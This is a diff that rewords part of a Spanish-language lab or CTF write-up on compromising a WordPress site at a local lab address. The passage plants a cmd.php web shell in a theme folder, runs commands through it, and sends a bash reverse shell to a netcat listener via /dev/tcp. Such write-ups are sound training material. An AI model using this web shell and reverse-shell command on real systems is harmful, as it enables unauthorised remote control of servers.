@@ -78,14 +78,14 @@ Ahora volvemos al panel de login que estaría en la siguiente ruta: `http://172.
 
 <br>
 
-Pinchando en el botón de `Create` de la derecha nos aparecerá el siguiente pop-up para crear u archivo/carpeta, creamos un archivo llamado `cmd.php`.
+Pinchando en el botón de `Create` de la derecha nos aparecerá el siguiente pop-up para crear um archivo/carpeta, creamos un archivo de nombre `cmd.php`.
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/684232e5-7e9b-4bae-b38f-48f1640beef6)
 
 <br>
 
-Dicho archivo `.php` tendrá el siguiente contenido: 
+Pasamos a editar dicho archivo `.php` que tendrá el siguiente contenido: 
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/563a2366-2256-48c9-818c-a56d2b398b3a)
@@ -99,14 +99,14 @@ Lo que debemos hacer ahora es acceder a dicho archivo a través de la URL, para 
 
 <br>
 
-Y lo que queremos es acceder al archivo de nombre `cmd.php` introduciremos en la URL lo siguiente: `http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php`, y listo conseguiremos RCE (Remove Code Execution) pasándole como parámetro el comando que queremos ejecutar en este caso `id`:
+Y lo que queremos es acceder al archivo de nombre `cmd.php` por lo que introduciremos en la URL lo siguiente: `http://172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php`, y listo conseguiremos RCE (Remove Code Execution) pasándole como parámetro a `cmd` el comando que queremos ejecutar en este caso `id`:
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/ebca85b8-2f72-4f24-bdd2-90a04be442d1)
 
 <br>
 
-Por lo que ahora nos mandaríamos una [revshell](https://www.revshells.com/), nos ponemos en escucha en un puerto poniendo en la terminal escribiendo lo siguiente `nc -nlvp 443`, y poniendo lo siguiente en el buscador `172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php?cmd=bash -c'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, y listo recibiríamos la revshell: 
+Por lo que ahora nos mandaríamos una [revshell](https://www.revshells.com/). En primer lugar, nos ponemos en escucha en un puerto poniendo en la terminal escribiendo lo siguiente `nc -nlvp 443`, y poniendo lo siguiente en el buscador `172.17.0.2/wordpress/wp-content/themes/twentytwentytwo/cmd.php?cmd=bash -c'bash -i >%26 /dev/tcp/172.17.0.1/443 0>%261'`, y listo recibiríamos la revshell: 
 <br>
 
 ![image](https://github.com/TerrorAterrador/WriteUps/assets/146730674/af76da05-55f2-4767-b1a9-15137429dc65)
